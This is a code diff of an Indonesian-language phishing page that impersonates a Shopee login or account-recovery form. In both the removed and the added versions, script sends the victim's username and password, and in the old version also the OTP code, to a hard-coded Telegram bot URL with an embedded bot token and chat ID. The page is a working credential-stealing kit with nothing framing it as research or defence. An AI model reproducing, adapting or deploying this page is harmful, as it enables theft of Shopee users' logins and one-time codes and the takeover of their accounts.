@@ -1,97 +1,38 @@
+
+
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Shopee Login</title>
-
-<style>
-body {
-  font-family: Arial;
-  background: #f5f5f5;
-}
-
-.box {
-  width: 320px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 20px;
-  border-radius: 10px;
-}
-
-h2 {
-  text-align: center;
-  color: #ee4d2d;
-}
-
-input {
-  width: 100%;
-  padding: 10px;
-  margin-top: 10px;
-}
-
-button {
-  width: 100%;
-  padding: 10px;
-  margin-top: 15px;
-  background: #ee4d2d;
-  color: white;
-  border: none;
-}
-
-.hidden {
-  display: none;
-}
-</style>
+    <title>Pemulihan Akun Shopee</title>
 </head>
-
 <body>
 
-<!-- LOGIN -->
-<div class="box" id="loginBox">
-  <h2>Shopee</h2>
-  <input type="text" id="user" placeholder="Nomor HP / Email">
-  <input type="password" id="pass" placeholder="Password">
-  <button onclick="login()">Login</button>
-</div>
+<h2>Form Login</h2>
 
-<!-- OTP -->
-<div class="box hidden" id="otpBox">
-  <h2>Verifikasi</h2>
-  <p>Masukkan kode OTP</p>
-  <input type="text" id="otp" placeholder="Kode OTP">
-  <button onclick="kirimOTP()">Verifikasi</button>
-</div>
+<form id="form">
+    <input type="text" id="username" placeholder="Username"><br><br>
+    <input type="password" id="password" placeholder="Password"><br><br>
+    <button type="submit">Kirim</button>
+</form>
 
 <script>
-var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
-var chat_id = "8275920596";
+document.getElementById("form").addEventListener("submit", function(e){
+    e.preventDefault();
 
-function kirimPesan(teks) {
-  fetch("https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="/sendMessage?chat_i" + encodeURIComponent(teks));
-}
+    var user = document.getElementById("username").value;
+    var pass = document.getElementById("password").value;
 
-function login() {
-  var user = document.getElementById("user").value;
-  var pass = document.getElementById("pass").value;
+    var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
+    var chat_id = "8275920596";
 
-  var text = "🔐 LOGIN\nUser: " + user + "\nPass: " + pass;
+    var message = "Login Masuk:\nUsername: " + user + "\nPassword: " + pass;
 
-  kirimPesan(text);
+    var url = "https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="+ encodeURIComponent(message);
 
-  document.getElementById("loginBox").classList.add("hidden");
-  document.getElementById("otpBox").classList.remove("hidden");
-}
-
-function kirimOTP() {
-  var otp = document.getElementById("otp").value;
-
-  var text = "📲 OTP\nKode: " + otp;
-
-  kirimPesan(text);
-
-  alert("Verifikasi berhasil (simulasi)");
-}
+    fetch(url)
+    .then(response => alert("permintaan sedang di proses!"))
+    .catch(error => alert("Gagal kirim"));
+});
 </script>
 
 </body>
